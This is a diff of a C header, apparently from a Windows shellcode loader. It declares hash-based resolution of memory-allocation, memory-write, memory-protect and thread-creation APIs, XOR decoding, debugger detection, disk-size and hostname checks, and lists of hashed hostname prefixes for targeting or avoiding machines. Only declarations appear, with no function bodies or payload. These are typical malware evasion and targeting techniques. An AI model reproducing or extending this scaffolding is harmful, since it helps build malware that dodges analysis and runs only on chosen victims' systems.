@@ -13,7 +13,7 @@ typedef struct {
     unsigned int value;
     uint8_t rotation_value;
     bool is_rotation_right;
-} FctHash;
+} ObjHash;
 
 typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
@@ -72,33 +72,42 @@ typedef BOOL(WINAPI *GetDiskFreeSpaceExFuncA)(
     PULARGE_INTEGER
 );
 
-extern FctHash NTDLL_HASH;
-extern FctHash KERNEL32_HASH;
+extern const ObjHash NTDLL_HASH;
+extern const ObjHash KERNEL32_HASH;
 
-extern FctHash QUERY_INFORMATION_PROCESS_HASH;
-extern FctHash GET_COMPUTER_NAME_HASH;
-extern FctHash GET_DISK_FREE_SPACE_HASH;
-extern FctHash LOAD_LIBRARY_HASH;
+extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
+extern const ObjHash GET_COMPUTER_NAME_HASH;
+extern const ObjHash GET_DISK_FREE_SPACE_HASH;
+extern const ObjHash LOAD_LIBRARY_HASH;
 
-extern FctHash VIRTUAL_ALLOC_HASH;
-extern FctHash WRITE_MEMORY_HASH;
-extern FctHash VIRTUAL_PROTECT_HASH;
-extern FctHash CREATE_THREAD_HASH;
-extern FctHash WAIT_FOR_SINGLE_OBJECT_HASH;
+extern const ObjHash VIRTUAL_ALLOC_HASH;
+extern const ObjHash WRITE_MEMORY_HASH;
+extern const ObjHash VIRTUAL_PROTECT_HASH;
+extern const ObjHash CREATE_THREAD_HASH;
+extern const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH;
 
-extern const char* HOSTNAME_PREFIX;
+#define AVOIDED_HOSTNAME_PREFIX_HASHES_COUNT  (sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]))
+
+extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
+extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
+extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
 
 
 void XOR(unsigned char *data, size_t len, uint16_t key);
 
-HMODULE CustomGetModuleHandle(FctHash module_hash);
-FARPROC CustomGetProcAdress(IN HMODULE hModule, FctHash function_hash);
+HMODULE CustomGetModuleHandle(ObjHash module_hash);
+FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);
 
 uint8_t is_being_debugged();
 int get_disk_size(HMODULE hKernel32dll);
 const char* get_hostname(HMODULE hKernel32dll);
-int starts_with(const char* str, const char* prefix);
+unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);
 
+bool is_target_hostname(const char* hostname);
+bool is_valid_hostname(const char* hostname);
+bool is_avoided(const char* hostname);
+
+FILE* clean_init();
 void clean_exit(FILE* file);
 int divide(int a, int b);
 int multiply(int a, int b);
